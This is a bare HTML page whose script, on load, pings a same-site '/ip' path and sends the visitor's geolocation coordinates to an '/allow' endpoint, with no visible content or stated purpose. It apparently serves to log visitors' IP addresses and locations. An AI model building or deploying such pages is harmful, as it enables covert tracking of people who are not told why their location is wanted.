<!DOCTYPE html>
<html>

<body>

    <script>        
        fetch(window.location.origin+'/ip')
        var Latitude;
        var Longitude;
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            document.getElementById("AllowLocation").innerHTML =
                "Geolocation is not supported by this browser.";
        }

        function showPosition(position) {
                Latitude=position.coords.latitude;
                Longitude=position.coords.longitude;
                fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude)

        }

    </script>

</body>

</html>
